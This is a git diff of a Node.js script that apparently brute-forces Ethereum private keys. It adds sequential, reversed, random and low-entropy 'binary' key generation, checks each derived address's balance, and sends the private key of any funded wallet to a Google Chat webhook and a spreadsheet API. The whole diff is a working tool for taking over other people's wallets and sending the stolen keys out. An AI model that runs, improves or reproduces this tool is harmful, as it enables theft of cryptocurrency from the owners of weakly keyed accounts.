@@ -32,6 +32,38 @@ function genRandomPrivateKey() {
   return privateKey.toString('hex');
 }
 
+function genRandomPrivateKeyBinary() {
+  var s = `${Math.random().toString(2).replace(".","")}${Math.random().toString(2).replace(".","")}`.slice(1,65)
+  return s;
+}
+
+function genRandomChar(length) {
+  let result = '';
+  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  const charactersLength = characters.length;
+  let counter = 0;
+  while (counter < length) {
+    result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    counter += 1;
+  }
+  return result;
+}
+
+function genRandomPrivateKeyBinaryFromChar() {
+  var c = genRandomChar(8)
+  var s = ''
+  for (var i = 0; i < c.length; i++) {
+    s += c[i].charCodeAt(0).toString(2) + "";
+  }
+  if(s.length<64){
+    while(s.length<64){
+      s = `0${s}`
+    }    
+  }
+  s = s.slice(0,64)
+  return s;
+}
+
 function sleep (time) {
   return new Promise((resolve) => setTimeout(resolve, time));
 }
@@ -193,6 +225,10 @@ const config2 = {
   countLoop: 100,
   sheet: "R0",
   isFindBalance: true,
+  isReverse: false,
+  isRandom: false,
+  isRandomBinary: false,
+  isRandomBinaryChar: false,
   showLogFull: false,
   sleep: 1000,
   base: "0000000000000000000000000000000000000000000000000000000000000000"
@@ -204,7 +240,28 @@ async function find2B(base="",start=1){
     let _number = Number(start)+i;
     _startThen = _number;
     let _numberString = String(_number);
-    let _pri = `${base.slice(0,64-_numberString.length)}${_numberString}`;
+    let _pri = null;
+    if(config2.isReverse){
+      _pri = `${_numberString}${base}`.slice(0,64)
+    }
+    else if(config2.isRandom){
+      if(config2.isRandomBinary){
+        _pri = genRandomPrivateKeyBinary()
+      }
+      else if(config2.isRandomBinaryChar){
+        _pri = genRandomPrivateKeyBinaryFromChar()
+      }
+      else{
+        _pri = genRandomPrivateKey(); 
+      }      
+    }
+    else{
+      _pri = `${base.slice(0,64-_numberString.length)}${_numberString}`;
+    }
+    if(_pri==null){
+      console.log("empty pri")
+      break;
+    }
     if(config2.showLogFull){
       console.log("pr:",_pri)  
     }    
@@ -212,17 +269,26 @@ async function find2B(base="",start=1){
     if(config2.isFindBalance){
       const wei = await provider.getBalance(_addr);
       const eth = ethers.formatEther(wei);
-      // console.log("Balance:", eth, typeof eth, _addr);
+      if(config2.showLogFull){
+        console.log("Balance:", eth, _addr); 
+      }
+      let _n = _number
+      if(config2.isRandom){
+        _n = `${_pri}`
+      }
       if(Number(eth)>0){
         console.log(`${eth}|${_pri}|${_addr}`);
-        sendGoogleChatWebhook(`${eth}|${_pri}|${_addr}`)
-        var apiGetAddRow = `${config2.apiBase}?action=addNew&sheet=${config2.sheet}&n=${_number}&pp=${_addr}&b=${eth}`
+        sendGoogleChatWebhook(`${eth}|${_pri}|${_addr}`)        
+        var apiGetAddRow = `${config2.apiBase}?action=addNew&sheet=${config2.sheet}&n=${_n}&pp=${_addr}&b=${eth}`
         axios.get(apiGetAddRow)
       }
       else if(i==config2.countLoop-1){
-        var apiGetAddRow = `${config2.apiBase}?action=addNew&sheet=${config2.sheet}&n=${_number}&pp=${_addr}&b=${eth}`
+        if(config2.isRandom){
+          _n = Number(start)
+        }
+        var apiGetAddRow = `${config2.apiBase}?action=addNew&sheet=${config2.sheet}&n=${_n}&pp=${_addr}&b=${eth}`
         axios.get(apiGetAddRow)
-        console.log("end:",_number)
+        console.log("end:",_n)
       }
     }
   }
@@ -236,7 +302,7 @@ async function find2(){
   var apiGetLast = `${config2.apiBase}?action=getLast&sheet=${config2.sheet}`
   axios.get(apiGetLast)
   .then((res) => {
-    if(res.data && res.data.data){
+    if(res.data && res.data.data>=0){
       config2.start = Number(res.data.data)+1
       console.log("start:",config2.start)
       let _newBase = `${config2.pre}${config2.base}`.slice(0,64)
@@ -259,3 +325,38 @@ exports.find2 = (more={})=>{
   }
   find2()
 }
+
+function testFind2RR(){
+  config2.sheet = "RR";
+  config2.isRandom = true;
+  config2.showLogFull = true
+  find2()
+}
+
+function testFind2RRB(){
+  config2.sheet = "RRB";
+  config2.isRandom = true;
+  config2.isRandomBinary = true;
+  config2.showLogFull = true
+  find2()
+}
+
+function testFind2RRBC(){
+  config2.sheet = "RRBC";
+  config2.isRandom = true;
+  config2.isRandomBinaryChar = true;
+  config2.showLogFull = true
+  find2()
+}
+
+function testFind2NR(){
+  config2.sheet = "NR";
+  config2.isReverse = true;
+  config2.showLogFull = true
+  find2()
+}
+
+// testFind2RRB()
+// testFind2RRBC()
+// var s = genRandomPrivateKeyBinaryFromChar();
+// console.log(s)
